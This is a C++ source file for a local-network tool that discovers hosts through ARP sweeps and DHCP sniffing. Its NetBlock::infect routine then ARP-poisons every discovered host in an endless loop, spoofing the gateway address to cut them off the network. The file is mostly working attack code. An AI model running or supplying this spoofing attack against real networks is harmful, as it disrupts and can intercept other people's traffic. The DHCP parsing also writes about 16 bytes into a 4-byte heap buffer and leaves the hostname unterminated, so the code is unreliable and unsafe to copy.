#include "wscan.h"

void NetBlock::infect(WPcapDevice* device, WIp gateway,list<Host>* v)
{
    list<Host>::iterator iter;
    Etharp etharp;
    WPacket packet;

    while(1)
    {
        printf("\n<size>\n");
        std::cout<<v->size()<<std::endl;

        for(iter = v->begin(); iter!=v->end();iter++)
        {
            printf("\n<sendarp>\n");
            (*iter).mac_.print();
            (*iter).ip_.print();

            etharp = Etharp::makeArppacket((*iter).mac_,device->intf()->mac(),(*iter).mac_,(*iter).ip_,gateway);
            packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
            packet.buf_.size_ = sizeof(Etharp);

            for(int i =0; i<3; i++)
                device->write(packet.buf_);
            sleep(1);
        }
    }
}

void NetBlock::recover(WPcapDevice* device, WIntfList& intflist, WIp gateway, Host host)
{
    WIntf* intf_g = intflist.findByIp(gateway);//gateway interface

    Etharp etharp = Etharp::makeArppacket(host.mac_,intf_g->mac(),host.mac_,host.ip_,gateway);
    WPacket packet;
    packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
    packet.buf_.size_ = sizeof(Etharp);

    for(int i =0; i<3; i++)
        device->write(packet.buf_);
}

void Scan::scan(WPcapDevice* device, WIp gateway)
{
    WPacket packet;
    packet.buf_.size_ = sizeof(Etharp);
    Etharp etharp = Etharp::makeArppacket(WMac("FF:FF:FF:FF:FF:FF"),device->intf()->mac(),WMac("00:00:00:00:00:00"),WIp("0.0.0.0"),device->intf()->ip());

    WIntf* intf = device->intf();
    uint32_t beginIp = (intf->ip()&intf->mask())+1;
    uint32_t endIp = (intf->ip()|~intf->mask())-1;

    for(uint32_t ip = beginIp; ip!=endIp; ip++){
        if(WIp(ip)==gateway)continue;
        etharp.arp.tip_ = htonl(WIp(ip));
        packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
        for(int i = 0; i < 3; i++)
            device->write(packet.buf_);
    }
}

void Scan::acquire(WPcapDevice* device, list<Host>* v, WIp gateway, mutex* m)
{
    WPacket packet;
    list<Host>::iterator iter;
    time_t start, end;
    start = time(NULL);
    while(1)
    {
        if(device->WPcapCapture::read(&packet)==WPacket::Result::Ok)
        {
            if(packet.ethHdr_->type()!=WEthHdr::Arp)continue;
            if(packet.ethHdr_->dmac_!=device->intf()->mac()||packet.arpHdr_->op()!=packet.arpHdr_->Reply)continue;

            WIp mask = device->intf()->mask();
            Host g;

            if((packet.arpHdr_->sip()&mask)==(gateway&mask))
            {
                printf("\n<full scan>\n");
                g.mac_ = packet.ethHdr_->smac();
                g.ip_ = packet.arpHdr_->sip();
                g.mac_.print();
                g.ip_.print();
            }

            int tmp = 0;
            for(iter = v->begin(); iter!=v->end();iter++){
                if((*iter).ip_==g.ip_){
                    tmp = 1;
                    break;
                }
            }
            if(!tmp){
                m->lock();
                v->push_back(g);
                m->unlock();
            }
        }

        end = time(NULL);
        if(end-start>10)return;
    }
}

void Scan::open(WPcapDevice* DHdevice, WPcapDevice* FSdevice, WIp gateway, list<Host>* v, mutex* m)
{
    thread dhcp(dhcpScan,DHdevice,v,m);
    thread scan_(scan,FSdevice,gateway);
    thread acquire_(acquire,FSdevice,v,gateway,m);
    dhcp.detach();
    scan_.join();
    acquire_.join();
}

Etharp Etharp::makeArppacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip)
{
    Etharp etharp;
    etharp.eth.dmac_ = dmac;
    etharp.eth.smac_ = smac;
    etharp.eth.type_ = htons(WEthHdr::Arp);

    etharp.arp.hrd_ = htons(WArpHdr::ETHER);
    etharp.arp.pro_ = htons(WEthHdr::Ip4);
    etharp.arp.hln_ = WMac::SIZE;
    etharp.arp.pln_ = WIp::SIZE;
    etharp.arp.op_ = htons(WArpHdr::Request);
    etharp.arp.smac_ = smac;
    etharp.arp.sip_ = htonl(sip);
    etharp.arp.tmac_ = tmac;
    etharp.arp.tip_ = htonl(tip);
    return etharp;
}

void Scan::dhcpScan(WPcapDevice* device, list<Host>* v, mutex* m)
{
    WPacket packet;
    while(1)
    {
        if(device->WPcapCapture::read(&packet)==WPacket::Result::Ok)
        {
            if(packet.ethHdr_->type()!=WEthHdr::Ip4)continue;
            if(packet.ipHdr_->p()!=WIpHdr::Udp)continue;
            if(packet.udpHdr_->sport()!=67&&packet.udpHdr_->dport()!=67)continue;//Is dhcp packet?
            if(!packet.ethHdr_->dmac_.isBroadcast())continue; // Is DHCP Request?

            packet.dhcpHdr_ = (WDhcpHdr*)packet.udpData_.data_;
            printf("\n<Dhcp>\n");
            Host g;
            g.mac_ = packet.dhcpHdr_->clientMac_;//get mac
            g.mac_.print();

            for(WDhcpHdr::Option* opt = packet.dhcpHdr_->first(); opt!=nullptr; opt=opt->next())
            {
                if(opt->type_ == 50)//get ip
                {
                    char* buf = (char*)malloc(sizeof(char)*4);
                    for(int i = 0; i<opt->len_-1; i++)
                        sprintf(buf+4*i,"%03d.",*(&opt->len_+1+i));
                    sprintf(buf+12,"%03d",*(&opt->len_+4));

                    string str(buf);
                    g.ip_ = WIp(str);
                    g.ip_.print();
                }
                else if(opt->type_ == 12)//get name
                {
                    g.name = (char*)malloc(sizeof(char)*opt->len_);
                    for(int i = 0; i<opt->len_;i++)
                        g.name[i] = *(&opt->len_+1+i);
                }
            }
            m->lock();
            v->push_back(g);
            m->unlock();
        }
    }
}
